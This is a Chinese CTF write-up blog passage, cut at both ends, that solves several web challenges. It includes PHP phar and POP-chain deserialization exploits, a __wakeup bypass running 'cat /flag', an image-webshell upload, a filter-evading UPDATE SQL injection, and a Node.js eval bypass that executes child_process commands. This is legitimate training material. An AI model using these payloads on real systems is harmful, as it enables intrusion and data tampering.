<p>后面对于文件的处理，则是先取出完整的文件名称，例如exp.php经过<code>$_FILES["file"]["name"]</code>处理后依然是exp.php之后，拼接我们的ip地址，也就是在页面右上角处（如下图所示）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313171243987.png" alt="image-20240313171243987"></p>
<p>之后经过md5的加密组成文件名+jpg的方式，最后就是md5(拼接字符串).jpg，这也是我们最后访问的文件名。</p>
<p>接下来就是针对class的反序列化链子的分析了：这里不难分析，主要先定位到引起phar反序列化的点file_get_contents函数，这也就是最后读取flag的函数。</p>
<p>进一步分析不难发现这个链子：<code>C1e4r.__destruct-》Show.__toString-》Test.__get-》Test.get-》Test.file_get</code>，最后pop如下</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>}<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"exp.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">'&lt;?php __HALT_COMPILER();?&gt;'</span>); <span class="hljs-comment">//设置stub</span><br><span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$pop</span>-&gt;str = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$pop</span>-&gt;str-&gt;str = <span class="hljs-keyword">array</span>(<span class="hljs-string">"str"</span>=&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>());<br><span class="hljs-variable">$pop</span>-&gt;str-&gt;str[<span class="hljs-string">'str'</span>]-&gt;params = <span class="hljs-keyword">array</span>(<span class="hljs-string">"source"</span>=&gt;<span class="hljs-string">'/var/www/html/f1ag.php'</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$pop</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里我也陷入了一个误区就是对于调用_get魔术方法的理解。我以为<code>$this-&gt;str['str']-&gt;source</code>这一步的调用，是将source的参数值赋值给了get魔术方法的参数key，没想到看了PHP手册发现是直接将source参数名称复制给了key，这才有了后续的<code>array("source"=&gt;'/var/www/html/f1ag.php')</code>的产生。</p>
<p>最后生成的phar文件，修改后缀即可，最后file参数访问即可得到flag</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313170858005.png" alt="image-20240313170858005"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313170924146.png" alt="image-20240313170924146"></p>
<h1>[SWPUCTF 2023 秋季新生赛]UnS3rialize</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NSS</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Congratulations!!!You have learned to construct a POP chain&lt;br/&gt;"</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    }<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"W4keup!!!&lt;br/&gt;"</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">"echo Welcome to NSSCTF"</span>;<br>    }<br>}<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$whoami</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$argv</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"what do you want?"</span>;<br>        <span class="hljs-variable">$want</span> = <span class="hljs-variable language_">$this</span>-&gt;whoami;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$want</span>();<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sth</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Now you know how to use __toString&lt;br/&gt;There is more than one way to trigger"</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;sth-&gt;<span class="hljs-keyword">var</span>;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span> = <span class="hljs-string">"nss"</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">"ctf"</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$notes</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$passwd</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;user = <span class="hljs-variable">$user</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-variable">$passwd</span>;<br>    }<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;user === <span class="hljs-string">"SWPU"</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">"NSS"</span>) {<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">"Now you know how to use __construct&lt;br/&gt;"</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">"your notes"</span>.<span class="hljs-variable language_">$this</span>-&gt;notes;<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">"N0!"</span>);<br>        }<br>    }<br>}<br><br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ser'</span>])) {<br>    <span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ser'</span>]));<br>} <span class="hljs-keyword">else</span> {<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Let's do some deserialization :)"</span>;<br>}<br>Let<span class="hljs-string">'s do some deserialization :)</span><br></code></pre></td></tr></tbody></table></figure>
<p>这道题，链子简单，就是绕过wakeup就行了，也是老办法，链子如下</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NSS</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$whoami</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sth</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span> = <span class="hljs-string">"SWPU"</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">"NSS"</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$notes</span>;<br>}<br><span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">F</span>();<br><span class="hljs-variable">$pop</span>-&gt;notes = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">T</span>();<br><span class="hljs-variable">$pop</span>-&gt;notes-&gt;sth = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><span class="hljs-variable">$pop</span>-&gt;notes-&gt;sth-&gt;whoami = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NSS</span>();<br><span class="hljs-variable">$pop</span>-&gt;notes-&gt;sth-&gt;whoami-&gt;cmd = <span class="hljs-string">"cat /flag"</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>).<span class="hljs-string">"\n"</span>;<br><span class="hljs-variable">$pop1</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'"F":3'</span>,<span class="hljs-string">'"F":4'</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$pop1</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>修改属性数量即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313183346732.png" alt="image-20240313183346732"></p>
<h1>[SWPUCTF 2023 秋季新生赛]ez_talk</h1>
<p>这里首先直接上传了php文件，结果在修改mime，后缀，文件头，都不行。且给的提示始终如一，所以我上传了正常的文件，之后发现根本不检测后缀。</p>
<p>于是尝试在正常图片加载php一句话木马，但依旧被ban，原因如下图使用了getimagesize函数来检测文件内容。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313184641627.png" alt="image-20240313184641627"></p>
<p>因此直接上传图片马，然后bp抓包修改后缀，访问对应文件；如下图，仔细观察就知道，上传目录他反转了而已，正常访问即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313184836860.png" alt="image-20240313184836860"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313184906275.png" alt="image-20240313184906275"></p>
<h1>[SWPUCTF 2023 秋季新生赛]NSS大卖场</h1>
<p>这也是第一次遇见update注入，脑子里根本没有这种想法，也是看了wp才自我认为想通了</p>
<p>首先是对页面常规测试了一番，也没什么信息，除了一个明显的hint，flag买不起。</p>
<p>虽然看了题目标签写着update注入，但是我虽然找到了注入点，但不知道如何下手，算是增长经验了。</p>
<p>首先看hint，给了一个数据库备份文件</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313192109988.png" alt="image-20240313192109988"></p>
<p>这里当时分析的时候，也没有分析出什么，看了wp才知道自己是没有分析的思路（就是不会分析）。</p>
<p>现在回过头来可以看到，这里面含有items表，而其中含有各种列名，但值得注意的就是price价格表，这也似乎成了后面为何想到update注入的关键了。</p>
<p>这里会想到通过update来更改items的price为1，这样就买的起了，接下来就是找注入点了，可以想到买商品的地方很可能存在注入点。这里尝试了一番，直接在url后面加了个单引号，于是爆出sql错误，接着进行恶意语句的写入，发现过滤了如下关键字</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">SELECT|select|UPDATE|update|WHERE|where| |or|AND|and|<span class="hljs-attribute">ORDER</span>|<span class="hljs-attribute">order</span>|BY|by|--|&lt;|&gt;|!<br></code></pre></td></tr></tbody></table></figure>
<p>但很明显可以大小写绕过，payload如下，这里不知道为何内联注释符不能代替空格</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">buy/<span class="hljs-number">1</span>';Update%<span class="hljs-number">09</span>items%<span class="hljs-number">09s</span>et%<span class="hljs-number">09</span>price=<span class="hljs-number">1</span>;#<span class="hljs-comment">//设置items的price字段全为1</span><br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">更新某一列<br>UPDATE <span class="hljs-selector-tag">table</span> SET column=new_value WHERE column= value<br><br>更新若干列<br>UPDATE <span class="hljs-selector-tag">table</span> SET column1=new_value1, column2=new_value2 WHEREcolumn= value<br></code></pre></td></tr></tbody></table></figure>
<p>之后直接买flag，查看即可</p>
<h1>[GFCTF 2021]ez_calc</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313194521226.png" alt="image-20240313194521226"></p>
<p>首先是一个登录框，这里看F12得到提示，采用nodejs处理，如果我们输入的用户名转换成小写不等于admin且转换为大写等于ADMIN且用户名等于admin123即可登录，这里翻了翻笔记，发现这样的特性</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">toUpperCase</span>()是javascript中将小写转换成大写的函数。<br><span class="hljs-built_in">toLowerCase</span>()是javascript中将大写转换成小写的函数<br>除此之外<br>在Character<span class="hljs-selector-class">.toUpperCase</span>()函数中，字符ı会转变为<span class="hljs-selector-tag">I</span>，字符ſ会变为S。<br>在Character<span class="hljs-selector-class">.toLowerCase</span>()函数中，字符İ会转变为<span class="hljs-selector-tag">i</span>，字符K会转变为k。<br></code></pre></td></tr></tbody></table></figure>
<p>很显然，这里采用特殊字符即可。登陆之后发现是个计算器</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313194708793.png" alt="image-20240313194708793"></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;!--<br>let calc = req<span class="hljs-selector-class">.body</span><span class="hljs-selector-class">.calc</span>;<br>let flag = false;<br><span class="hljs-comment">//waf</span><br>for (let i = <span class="hljs-number">0</span>; i &lt; calc.length; i++) {<br>    if (flag || "/(flc'\".".split``.some(v =&gt; v == calc[i])) {<br>        <span class="hljs-comment">//禁用(,'f','l','c',"'",'"','.' 这些字符</span><br>        flag = true;<br>        calc = calc<span class="hljs-selector-class">.slice</span>(<span class="hljs-number">0</span>, i) + "*" + calc<span class="hljs-selector-class">.slice</span>(i + <span class="hljs-number">1</span>, calc.length);<br>    }<br>}<br><span class="hljs-comment">//截取</span><br>calc = calc<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>);<br><span class="hljs-comment">//去空</span><br>calc = calc<span class="hljs-selector-class">.replace</span>(/\s+/g, "");<br><br>calc = calc<span class="hljs-selector-class">.replace</span>(/\\/g, "\\\\");<span class="hljs-comment">//将反斜杠替换为两个反斜杠</span><br><br><span class="hljs-comment">//小明的同学过滤了一些比较危险的东西</span><br>while (calc.indexOf("sh") &gt; -<span class="hljs-number">1</span>) {<br>    calc = calc<span class="hljs-selector-class">.replace</span>("sh", "");<br>}<br>while (calc.indexOf("ln") &gt; -<span class="hljs-number">1</span>) {<br>    calc = calc<span class="hljs-selector-class">.replace</span>("ln", "");<br>}<br>while (calc.indexOf("fs") &gt; -<span class="hljs-number">1</span>) {<br>    calc = calc<span class="hljs-selector-class">.replace</span>("fs", "");<br>}<br>while (calc.indexOf("x") &gt; -<span class="hljs-number">1</span>) {<br>    calc = calc<span class="hljs-selector-class">.replace</span>("x", "");<br>}<br><br>try {<br>    result = <span class="hljs-built_in">eval</span>(calc);<br><br>}<br>--&gt;<br></code></pre></td></tr></tbody></table></figure>
<p>这里主要就是绕过第一个if条件语句的限制，首先他会检查传入的calc字符串的每一位字符是否为黑名单中的字符，如果是的话则过滤掉。这里限制的很死，我也是第一次遇见，只能看wp了，发现利用的是数组绕过。</p>
<p>原理是，如果我们传入如下内容：<code>["aaaaa","bbbbb",ccccc]</code>，那么该长度就是3了，而不是字符串的长度了。</p>
<p>这里似乎他在检查的时候，就只会把第一个元素当做整体了，即使其中包含黑名单字符，也不会进行过滤了，也就是这样的：<code>["a)aaa","bbbbb","(",]</code>在经过过滤之后会变成<code>a)a********</code>，因为他是在第三个为发现了敏感字符。于是按照逻辑，会将第三位以后得内容都进行替换。这样我们第一个元素的敏感字符就逃逸了。</p>
<p>详细解释可以参考：<a target="_blank" rel="noopener" href="https://www.gem-love.com/2020/03/19/%E4%B8%80%E9%81%93node-js%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%B1%A1%E6%9F%93%E4%B8%8E%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E5%AE%9E%E7%8E%B0sql%E6%B3%A8%E5%85%A5%E7%9A%84%E9%A2%98%E7%9B%AE%E5%88%86/#undefined">一道Node.js类型混淆污染与字符逃逸实现SQL注入的题目分析</a></p>
<p>至于为什么一定要在最后搞一个敏感字符，那是因为如果都是正常的话，程序就会报错，但如果含有敏感字符，那前面的payload就可以执行</p>
<p>这样的话，可以按照逻辑进行如下构造：我们想要构造payload有多长，后面的数组就需要多少</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-built_in">require</span>("child_process")<span class="hljs-selector-class">.spawnSync</span>('ls',['/'])<span class="hljs-selector-class">.stdout</span><span class="hljs-selector-class">.toString</span>();&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=.<br></code></pre></td></tr></tbody></table></figure>
<p>这里不加<code>stdout.toString()</code>就没回显</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313211135632.png" alt="image-20240313211135632"></p>
<p>接下来就是读取了，因为flag的名字很长，会超过长度限制，因此这里又需要对代码的理解了（GFCTF_is_girlfriend_ctf.flag）</p>
<p>这里过滤了x，也无法直接利用<code>exec</code>，但是实际上这里是可以绕过的，因为我们通过<code>require</code>导入的模块是一个<code>Object</code>，那么就可以通过<code>Object.values</code>获取到<code>child_process</code>里面的各种方法，那么再通过数组下标<code>[5]</code>就可以得到<code>execSync</code>了，那么有了<code>execSync</code>后就可以通过写入文件的方式读取flag了，<code>payload</code>如下:</p>
